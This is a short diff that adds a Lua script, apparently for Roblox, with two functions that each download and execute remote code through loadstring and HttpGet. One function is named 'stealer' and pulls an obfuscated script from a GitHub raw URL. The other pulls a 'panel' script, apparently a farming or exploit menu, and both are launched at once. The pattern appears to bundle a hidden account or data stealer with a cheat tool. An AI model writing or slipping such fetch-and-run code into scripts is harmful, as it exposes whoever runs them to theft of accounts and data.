@@ -1,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/NextPython/OnyxHub/refs/heads/main/obfuscated.lua'))()
+end
+local function farm()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/kigredns/testUIDK/refs/heads/main/panel.lua'))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
